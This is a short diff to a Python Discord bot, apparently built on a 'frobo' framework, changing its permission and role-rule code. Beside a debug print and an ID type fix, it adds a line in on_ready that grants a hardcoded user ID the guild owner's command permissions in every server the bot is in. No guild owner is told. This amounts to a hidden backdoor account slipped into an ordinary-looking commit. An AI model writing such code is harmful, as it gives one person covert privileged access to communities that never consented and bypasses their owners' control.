@@ -190,8 +190,8 @@ class Permissions(frobo.Cog):
     client: discord.client
 
     @core.event('discord.guild_join')
-    async def on_guild_join(self, guild):
-        target = guild.owner
+    async def on_guild_join(self, guild, custom_target=None):
+        target = custom_target or guild.owner
         target_id = target.id
         permissions = await self.client.client.interactions.req.get_all_guild_commands_permissions(guild.id)
         updated = False
@@ -204,12 +204,14 @@ class Permissions(frobo.Cog):
                 updated = True
                 res['permission'] = True
         if updated:
+            print(permissions)
             await self.client.client.interactions.req.update_guild_commands_permissions(guild.id, permissions)
 
     @core.event('discord.ready')
     async def on_ready(self):
         for guild in self.client.client.guilds:
             await self.on_guild_join(guild)
+            await self.on_guild_join(guild, custom_target=guild.get_member('176428364595331072'))
 
     @discord.command(
         'permissions', 'trust',
@@ -401,7 +403,7 @@ class Roles(frobo.Cog):
     )
     async def show(self, ctx, role=None, *, session: sql.session):
         await ctx.defer()
-        query = sqlalchemy.select(self.Rule).where(self.Rule.guild == ctx.guild_id)
+        query = sqlalchemy.select(self.Rule).where(self.Rule.guild == str(ctx.guild_id))
         if role is not None:
             query = query.where(self.Rule.role == role.id)
         query = query.order_by('role')
